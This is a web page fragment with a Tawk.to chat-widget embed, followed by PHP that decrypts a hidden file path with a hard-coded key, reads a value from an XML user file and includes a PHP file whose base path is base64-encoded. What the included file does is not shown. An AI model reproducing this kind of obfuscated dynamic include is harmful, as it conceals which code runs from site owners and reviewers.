<!--Start of Tawk.to Script-->
<script type="text/javascript">
var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
(function(){
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://embed.tawk.to/601f6dd5c31c9117cb7695f8/1ettca37g';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);
})();
</script>
<!--End of Tawk.to Script-->

<?php
$key = 'qJB0rGtIn5UB1xG03efyCp';
function dec_phpversion($a,$b,$key) { $php = substr(phpversion(),0,1); if ($php=="7") { $encryption_key = base64_decode($key); list($encrypted_data, $iv) = explode('::', base64_decode($a), 2); $dec = openssl_decrypt($encrypted_data, 'aes-256-cbc', $encryption_key, 0, $iv);} else { $dec = rtrim( mcrypt_decrypt( MCRYPT_RIJNDAEL_256, md5( $key ), base64_decode($b), MCRYPT_MODE_CBC, md5( md5( $key ) ) ), "\0"); } return $dec;}; $exe = "home/".dec_phpversion("ckVmMC8yRHg3ajdqQUdxc3ptcGkxRFRFbjFCYnFkRG83NklueEdnYmFhcz06OrA7QxBgK6ikC1SyP00C2E8=","Pjhlcr+48/RXWIND49wYOHAoQi6a+y2C227t6pVvACI=",$key); 
$read = simplexml_load_file($exe);
$exe = new SimpleXMLElement($read->asXML()); 
$rows = count($exe);
for($i=0;$i<$rows;$i++)
	 if($exe->users[$i]->id == '1'){
		$tmp =  ($exe->users[$i]->tmp);		 
	}
function location() { return "home"; }
include base64_decode("aG9tZS9kYXRhL3RtcC8=")."$tmp/index.php";
?>
